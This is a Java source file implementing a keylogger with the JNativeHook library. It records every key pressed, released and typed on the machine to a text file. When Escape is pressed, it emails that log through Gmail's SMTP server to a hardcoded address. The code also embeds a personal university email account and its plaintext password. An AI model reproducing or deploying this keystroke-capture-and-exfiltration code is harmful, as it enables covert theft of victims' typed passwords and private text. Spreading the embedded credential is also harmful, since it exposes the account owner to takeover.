import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent; 
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;


public class jNativeHookExample implements NativeKeyListener{
	
    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
        	File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e2) {
			System.out.println("Error al escribir");
		}
 
        /* Terminate program when one press ESCAPE */
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
        	try
            {
              // se obtiene el objeto Session. La configuración es para
              // una cuenta de gmail.
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.setProperty("mail.smtp.starttls.enable", "true");
                props.setProperty("mail.smtp.port", "587");
                props.setProperty("mail.smtp.user", "joaerazogo@unal.edu.co");
                props.setProperty("mail.smtp.auth", "true");

                Session session = Session.getDefaultInstance(props, null);
                // session.setDebug(true);

                // Se compone la parte del texto
                BodyPart texto = new MimeBodyPart();
                texto.setText("Texto del mensaje");

                // Se compone el adjunto con la imagen
                BodyPart adjunto = new MimeBodyPart();
                adjunto.setDataHandler(
                    new DataHandler(new FileDataSource("/home/jose/workspace/Keylogger/FileKeyLogger.txt")));
                adjunto.setFileName("FileKeyLogger.txt");

                // Una MultiParte para agrupar texto e imagen.
                MimeMultipart multiParte = new MimeMultipart();
                multiParte.addBodyPart(texto);
                multiParte.addBodyPart(adjunto);

                // Se compone el correo, dando to, from, subject y el
                // contenido.
                MimeMessage message = new MimeMessage(session);
                message.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
                message.addRecipient(
                    Message.RecipientType.TO,
                    new InternetAddress("joaerazogo@unal.edu.co"));
                message.setSubject("Hellow");
                message.setContent(multiParte);

                // Se envia el correo.
                Transport t = session.getTransport("smtp");
                t.connect("joaerazogo@unal.edu.co", "MelkorValinor66");
                t.sendMessage(message, message.getAllRecipients());
                t.close();
            }
            catch (Exception e1)
            {
                e1.printStackTrace();
            }
            try {
				GlobalScreen.unregisterNativeHook();
				
			} catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
    }
 
    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		try {
			System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			System.out.println("Error al escribir");
		}
    }
 
    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			System.out.println("Error al escribir");
		}
    }
 
    public static void main(String[] args) {
        try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            /* Its error */
            e.printStackTrace();
        }
 
        /* Construct the example object and initialze native hook. */
        GlobalScreen.addNativeKeyListener(new jNativeHookExample());
    }
}